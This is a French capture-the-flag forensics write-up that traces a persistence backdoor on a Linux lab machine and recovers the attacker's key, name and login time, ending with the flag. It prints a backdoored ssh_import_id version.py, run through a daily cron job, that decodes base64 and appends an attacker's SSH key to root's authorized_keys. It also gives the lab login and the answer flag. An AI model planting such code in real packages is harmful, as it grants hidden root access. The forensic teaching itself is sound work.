# La menace persiste

Server user:pass is user:user

```
root@debs:/home/user# ls /etc/cron.daily/
apport                  bsdmainutils            logrotate               .placeholder            python-update
apt-compat              dpkg                    man-db                  popularity-contest      update-notifier-common
```

```python
root@debs:/home/user# cat /etc/cron.daily/python-update
#!/bin/sh

# Récupérer la version de ssh_import_id
VER=$(python3 -c 'import ssh_import_id; print(ssh_import_id.VERSION)')
MAJOR=$(echo $VER | cut -d'.' -f1)

# Mettre à jour ssh_import_id si la version majeure est supérieure à 6
if [ $MAJOR -gt 6 ]; then
    pip3 install --upgrade ssh-import-id
fi
```

```python
root@debs:/home/user# ls /lib/python3/dist-packages/ssh_import_id/
__init__.py  __main__.py  __pycache__/ version.py
root@debs:/home/user# cat /lib/python3/dist-packages/ssh_import_id/version.py
# This file is part of ssh-import-id. See LICENSE file for more info.
import base64

_LAST_RELEASE = "5.10"
_PACKAGED_VERSION = '5.10-0ubuntu1'

VERSION = _LAST_RELEASE

if not _PACKAGED_VERSION.startswith("@@"):
    VERSION = _PACKAGED_VERSION

k = "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDMWhHTGlYdWdUL0pJNnQ5akxmaEFHakdGaktQZzI4WW5xbmZrakdFVFpkRHkwTU14emdFRldqUEI2QVMxVmY2Wm5BY3JZWVFvTS9nWGNqRHpiNDc1azlXZmRaNDRNbWpQbjNXSzFGQXlEczJzTnNqdjQ1dFhKK0RaamlJQjV2Q2Zudk15VVYzdVArTVlTU2ltYWZ4L0FVVkVNZ3FINUZFa3NaZWltMXRhT0dTa0RDcGtMOTZndXVmaXJUZjZmR2Z5QlFLY2hsUGdrcmxYeUdwUWdlbnFEaGdadHF3SlR0U0YxYi9EeHR6VlRJNElnSVlocFlrbzVyU1h4R2R4OHQweVpJTkU4bmJIcTJUWHZFWERUaEltOEdmMmdlMEJDSjZ0YjlzaWZTSEtGYWNxZzZoWm5vT3g3SzYrbExCcjlwMTRKNVlQaUF3Z3FGRzN6RWVISVE2Mk1tQmNPUHBKalJTcTk3NjFXaGxNcmJRS3ZCY0R5SFJxQUs1NmFkanRXbkY1S3c4OG1OS3hsaEV3cHk5a21yWk42dkZyZ0VuTjRybkhuOVhLMUptY0Q2UW9jMUpWeldESnRIaEJyN3YrR3lYMjZ6dldtYnlhaFByZUFSdnJ2K01aL0V4N0tJeUlDWnY4Nk9ROXF3VDZ3WFFGQ2lXY05ZM0lsYWxoaTk5Qk9RSkU9IHNvbGlkc3RlYWtAYmFzdGFybGlz"
kd = base64.b64decode(k).decode('utf-8')

p = "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXM="
pd = base64.b64decode(p).decode('utf-8')

with open(pd, 'a') as file:
    file.write(f"{kd}\n")
# vi: ts=4 expandtab syntax=python
```

```
root@debs:/home/user# cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1hGLiXugT/JI6t9jLfhAGjGFjKPg28YnqnfkjGETZdDy0MMxzgEFWjPB6AS1Vf6ZnAcrYYQoM/gXcjDzb475k9WfdZ44MmjPn3WK1FAyDs2sNsjv45tXJ+DZjiIB5vCfnvMyUV3uP+MYSSimafx/AUVEMgqH5FEksZeim1taOGSkDCpkL96guufirTf6fGfyBQKchlPgkrlXyGpQgenqDhgZtqwJTtSF1b/DxtzVTI4IgIYhpYko5rSXxGdx8t0yZINE8nbHq2TXvEXDThIm8Gf2ge0BCJ6tb9sifSHKFacqg6hZnoOx7K6+lLBr9p14J5YPiAwgqFG3zEeHIQ62MmBcOPpJjRSq9761WhlMrbQKvBcDyHRqAK56adjtWnF5Kw88mNKxlhEwpy9kmrZN6vFrgEnN4rnHn9XK1JmcD6Qoc1JVzWDJtHhBr7v+GyX26zvWmbyahPreARvrv+MZ/Ex7KIyICZv86OQ9qwT6wXQFCiWcNY3Ilalhi99BOQJE= solidsteak@bastarlis
```

On sait maintenant que la clé publique de l'attaquant est dans les authorized_keys du user root

On va maintant checker __/var/log/auth.log.1__ la connexion que l'attaquant à pu faire. 
Elle est reconnaissable grace au log __"Accepted publickey for root"__

```
user@debs:~$ cat /var/log/auth.log.1
May 27 13:33:56 debs su: pam_unix(su:session): session closed for user root
May 27 13:33:56 debs sudo: pam_unix(sudo:session): session closed for user root
May 27 13:35:04 debs sshd[19288]: Received disconnect from 192.168.1.134 port 50654:11: disconnected by user
May 27 13:35:05 debs sshd[19288]: Disconnected from user user 192.168.1.134 port 50654
May 27 13:35:05 debs systemd-logind[672]: Session 19 logged out. Waiting for processes to exit.
May 27 13:35:05 debs sshd[19192]: pam_unix(sshd:session): session closed for user user
May 27 13:35:05 debs systemd-logind[672]: Removed session 19.
May 27 13:35:30 debs sshd[19359]: Accepted password for user from 192.168.1.134 port 50658 ssh2
May 27 13:35:30 debs sshd[19359]: pam_unix(sshd:session): session opened for user user by (uid=0)
May 27 13:35:30 debs systemd-logind[672]: New session 21 of user user.
May 27 13:35:30 debs systemd: pam_unix(systemd-user:session): session opened for user user by (uid=0)
May 27 13:35:51 debs sshd[19453]: Received disconnect from 192.168.1.134 port 50658:11: disconnected by user
May 27 13:35:51 debs sshd[19453]: Disconnected from user user 192.168.1.134 port 50658
May 27 13:35:51 debs sshd[19359]: pam_unix(sshd:session): session closed for user user
May 27 13:35:51 debs systemd-logind[672]: Session 21 logged out. Waiting for processes to exit.
May 27 13:35:51 debs systemd-logind[672]: Removed session 21.
May 27 13:35:58 debs sshd[19482]: Accepted publickey for root from 192.168.1.64 port 49322 ssh2: RSA SHA256:6cNdGceCRQJguU/ym9YEk4QoZfMBn9YriBTRh4GTaUY
May 27 13:35:58 debs sshd[19482]: pam_unix(sshd:session): session opened for user root by (uid=0)
May 27 13:35:58 debs systemd-logind[672]: New session 23 of user root.
May 27 13:35:58 debs systemd: pam_unix(systemd-user:session): session opened for user root by (uid=0)
May 27 13:36:37 debs sshd[19482]: Received disconnect from 192.168.1.64 port 49322:11: disconnected by user
May 27 13:36:37 debs sshd[19482]: Disconnected from user root 192.168.1.64 port 49322
May 27 13:36:37 debs sshd[19482]: pam_unix(sshd:session): session closed for user root
May 27 13:36:37 debs systemd-logind[672]: Session 23 logged out. Waiting for processes to exit.
May 27 13:36:37 debs systemd-logind[672]: Removed session 23.
May 27 13:36:46 debs sshd[19594]: Accepted password for user from 192.168.1.134 port 50659 ssh2
May 27 13:36:46 debs sshd[19594]: pam_unix(sshd:session): session opened for user user by (uid=0)
May 27 13:36:46 debs systemd-logind[672]: New session 25 of user user.
May 27 13:36:46 debs systemd: pam_unix(systemd-user:session): session opened for user user by (uid=0)
```

```
May 27 13:35:58 debs sshd[19482]: Accepted publickey for root from 192.168.1.64 port 49322 ssh2: RSA SHA256:6cNdGceCRQJguU/ym9YEk4QoZfMBn9YriBTRh4GTaUY
May 27 13:35:58 debs sshd[19482]: pam_unix(sshd:session): session opened for user root by (uid=0)
May 27 13:35:58 debs systemd-logind[672]: New session 23 of user root.
May 27 13:35:58 debs systemd: pam_unix(systemd-user:session): session opened for user root by (uid=0)
May 27 13:36:37 debs sshd[19482]: Received disconnect from 192.168.1.64 port 49322:11: disconnected by user
May 27 13:36:37 debs sshd[19482]: Disconnected from user root 192.168.1.64 port 49322
May 27 13:36:37 debs sshd[19482]: pam_unix(sshd:session): session closed for user root
May 27 13:36:37 debs systemd-logind[672]: Session 23 logged out. Waiting for processes to exit.
May 27 13:36:37 debs systemd-logind[672]: Removed session 23.
```

Retrouver le chemin complet du fichier permettant la persistance.

Retrouver le username et le hostname de l’attaquant.

Retrouver l’heure UTC à laquelle l’attaquant s’est connecté.

NBCTF{/lib/python3/dist-packages/ssh_import_id/version.py|solidsteak@bastarlis|13:35:58}